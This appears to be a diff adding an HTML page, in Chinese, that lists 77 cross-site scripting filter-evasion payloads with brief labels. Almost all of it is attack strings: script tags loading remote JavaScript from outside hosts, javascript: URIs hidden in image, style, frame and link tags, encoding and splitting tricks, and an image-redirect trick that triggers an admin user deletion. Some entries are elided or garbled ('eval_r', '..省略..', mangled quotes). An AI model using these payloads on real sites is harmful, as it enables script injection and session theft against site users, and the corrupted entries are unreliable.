@@ -1,0 +1,253 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>xss跨站脚本攻击汇总</title>
+</head><body>(1)普通的XSS JavaScript注入<br/>
+&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(2)IMG标签XSS使用JavaScript命令<br/>
+&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(3)IMG标签无分号无引号<br/>
+&lt;IMG SRC=javascript:alert(‘XSS’)&gt;<br/>
+<br/>
+(4)IMG标签大小写不敏感<br/>
+&lt;IMG SRC=JaVaScRiPt:alert(‘XSS’)&gt;<br/>
+<br/>
+(5)HTML编码(必须有分号)<br/>
+&lt;IMG SRC=javascript:alert(“XSS”)&gt;<br/>
+<br/>
+(6)修正缺陷IMG标签<br/>
+&lt;IMG “”"&gt;&lt;SCRIPT&gt;alert(“XSS”)&lt;/SCRIPT&gt;”&gt;<br/>
+<br/>
+(7)formCharCode标签(计算器)<br/>
+&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;<br/>
+<br/>
+(8)UTF-8的Unicode编码(计算器)<br/>
+&lt;IMG SRC=jav..省略..S')&gt;<br/>
+<br/>
+(9)7位的UTF-8的Unicode编码是没有分号的(计算器)<br/>
+&lt;IMG SRC=jav..省略..S')&gt;<br/>
+<br/>
+(10)十六进制编码也是没有分号(计算器)<br/>
+&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;<br/>
+<br/>
+(11)嵌入式标签,将Javascript分开<br/>
+&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(12)嵌入式编码标签,将Javascript分开<br/>
+&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(13)嵌入式换行符<br/>
+&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(14)嵌入式回车<br/>
+&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(15)嵌入式多行注入JavaScript,这是XSS极端的例子<br/>
+&lt;IMG SRC=”javascript:alert(‘XSS‘)”&gt;<br/>
+<br/>
+(16)解决限制字符(要求同页面)<br/>
+&lt;script&gt;z=’document.’&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’write(“‘&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’&lt;script’&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’ src=ht’&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’tp://ww’&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’w.shell’&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’.net/1.’&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;<br/>
+&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt;<br/>
+&lt;script&gt;eval_r(z)&lt;/script&gt;<br/>
+<br/>
+(17)空字符<br/>
+perl -e ‘print “&lt;IMG SRC=java\0script:alert(\”XSS\”)&gt;”;’ &gt; out<br/>
+<br/>
+(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用<br/>
+perl -e ‘print “&lt;SCR\0IPT&gt;alert(\”XSS\”)&lt;/SCR\0IPT&gt;”;’ &gt; out<br/>
+<br/>
+(19)Spaces和meta前的IMG标签<br/>
+&lt;IMG SRC=”  &nbsp;javascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(20)Non-alpha-non-digit XSS<br/>
+&lt;SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(21)Non-alpha-non-digit XSS to 2<br/>
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(“XSS”)&gt;<br/>
+<br/>
+(22)Non-alpha-non-digit XSS to 3<br/>
+&lt;SCRIPT/SRC=”http://3w.org/XSS/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(23)双开括号<br/>
+&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(24)无结束脚本标记(仅火狐等浏览器)<br/>
+&lt;SCRIPT SRC=http://3w.org/XSS/xss.js?&lt;B&gt;<br/>
+<br/>
+(25)无结束脚本标记2<br/>
+&lt;SCRIPT SRC=//3w.org/XSS/xss.js&gt;<br/>
+<br/>
+(26)半开的HTML/JavaScript XSS<br/>
+&lt;IMG SRC=”javascript:alert(‘XSS’)”<br/>
+<br/>
+(27)双开角括号<br/>
+&lt;iframe src=http://3w.org/XSS.html &lt;<br/>
+<br/>
+(28)无单引号 双引号 分号<br/>
+&lt;SCRIPT&gt;a=/XSS/<br/>
+alert(a.source)&lt;/SCRIPT&gt;<br/>
+<br/>
+(29)换码过滤的JavaScript<br/>
+\”;alert(‘XSS’);//<br/>
+<br/>
+(30)结束Title标签<br/>
+&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;<br/>
+<br/>
+(31)Input Image<br/>
+&lt;INPUT SRC=”javascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(32)BODY Image<br/>
+&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;<br/>
+<br/>
+(33)BODY标签<br/>
+&lt;BODY(‘XSS’)&gt;<br/>
+<br/>
+(34)IMG Dynsrc<br/>
+&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;<br/>
+<br/>
+(35)IMG Lowsrc<br/>
+&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;<br/>
+<br/>
+(36)BGSOUND<br/>
+&lt;BGSOUND SRC=”javascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(37)STYLE sheet<br/>
+&lt;LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(38)远程样式表<br/>
+&lt;LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”&gt;<br/>
+<br/>
+(39)List-style-image(列表式)<br/>
+&lt;STYLE&gt;li {list-style-image: url(“javascript:alert(‘XSS’)”);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS<br/>
+<br/>
+(40)IMG VBscript<br/>
+&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS<br/>
+<br/>
+(41)META链接url<br/>
+&lt;META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”&gt;<br/>
+<br/>
+(42)Iframe<br/>
+&lt;IFRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/IFRAME&gt;<br/>
+<br/>
+(43)Frame<br/>
+&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘XSS’);”&gt;&lt;/FRAMESET&gt;<br/>
+<br/>
+(44)Table<br/>
+&lt;TABLE BACKGROUND=”javascript:alert(‘XSS’)”&gt;<br/>
+<br/>
+(45)TD<br/>
+&lt;TABLE&gt;&lt;TD BACKGROUND=”javascript:alert(‘XSS’)”&gt;<br/>
+<br/>
+(46)DIV background-image<br/>
+&lt;DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”&gt;<br/>
+<br/>
+(47)DIV background-image后加上额外字符(1-32&amp;34&amp;39&amp;160&amp;8192-8&amp;13&amp;12288&amp;65279)<br/>
+&lt;DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”&gt;<br/>
+<br/>
+(48)DIV expression<br/>
+&lt;DIV STYLE=”width: expression_r(alert(‘XSS’));”&gt;<br/>
+<br/>
+(49)STYLE属性分拆表达<br/>
+&lt;IMG STYLE=”xss:expression_r(alert(‘XSS’))”&gt;<br/>
+<br/>
+(50)匿名STYLE(组成:开角号和一个字母开头)<br/>
+&lt;XSS STYLE=”xss:expression_r(alert(‘XSS’))”&gt;<br/>
+<br/>
+(51)STYLE background-image<br/>
+&lt;STYLE&gt;.XSS{background-image:url(“javascript:alert(‘XSS’)”);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;<br/>
+<br/>
+(52)IMG STYLE方式<br/>
+exppression(alert(“XSS”))’&gt;<br/>
+<br/>
+(53)STYLE background<br/>
+&lt;STYLE&gt;&lt;STYLE type=”text/css”&gt;BODY{background:url(“javascript:alert(‘XSS’)”)}&lt;/STYLE&gt;<br/>
+<br/>
+(54)BASE<br/>
+&lt;BASE HREF=”javascript:alert(‘XSS’);//”&gt;<br/>
+<br/>
+(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS<br/>
+&lt;EMBED SRC=”http://3w.org/XSS/xss.swf” &gt;&lt;/EMBED&gt;<br/>
+<br/>
+(56)在flash中使用ActionScrpt可以混进你XSS的代码<br/>
+a=”get”;<br/>
+b=”URL(\”";<br/>
+c=”javascript:”;<br/>
+d=”alert(‘XSS’);\”)”;<br/>
+eval_r(a+b+c+d);<br/>
+<br/>
+(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上<br/>
+&lt;HTML xmlns:xss&gt;<br/>
+&lt;?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”&gt;<br/>
+&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;<br/>
+&lt;/HTML&gt;<br/>
+<br/>
+(58)如果过滤了你的JS你可以在图片里添加JS代码来利用<br/>
+&lt;SCRIPT SRC=””&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(59)IMG嵌入式命令,可执行任意命令<br/>
+&lt;IMG SRC=”http://www.XXX.com/a.php?a=b”&gt;<br/>
+<br/>
+(60)IMG嵌入式命令(a.jpg在同服务器)<br/>
+Redirect 302 /a.jpg http://www.XXX.com/admin.asp&amp;deleteuser<br/>
+<br/>
+(61)绕符号过滤<br/>
+&lt;SCRIPT a=”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(62)<br/>
+&lt;SCRIPT =”&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(63)<br/>
+&lt;SCRIPT a=”&gt;” ” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(64)<br/>
+&lt;SCRIPT “a=’&gt;’” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(65)<br/>
+&lt;SCRIPT a=`&gt;` SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(66)<br/>
+&lt;SCRIPT a=”&gt;’&gt;” SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(67)<br/>
+&lt;SCRIPT&gt;document.write(“&lt;SCRI”);&lt;/SCRIPT&gt;PT SRC=”http://3w.org/xss.js”&gt;&lt;/SCRIPT&gt;<br/>
+<br/>
+(68)URL绕行<br/>
+&lt;A HREF=”http://127.0.0.1/”&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(69)URL编码<br/>
+&lt;A HREF=”http://3w.org”&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(70)IP十进制<br/>
+&lt;A HREF=”http://3232235521″&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(71)IP十六进制<br/>
+&lt;A HREF=”http://0xc0.0xa8.0×00.0×01″&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(72)IP八进制<br/>
+&lt;A HREF=”http://0300.0250.0000.0001″&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(73)混合编码<br/>
+&lt;A HREF=”h<br/>
+tt p://6 6.000146.0×7.147/”"&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(74)节省[http:]<br/>
+&lt;A HREF=”//www.google.com/”&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(75)节省[www]<br/>
+&lt;A HREF=”http://google.com/”&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(76)绝对点绝对DNS<br/>
+&lt;A HREF=”http://www.google.com./”&gt;XSS&lt;/A&gt;<br/>
+<br/>
+(77)javascript链接<br/>
+&lt;A HREF=”javascript:document.location=’http://www.google.com/’”&gt;XSS&lt;/A&gt;</body></html>
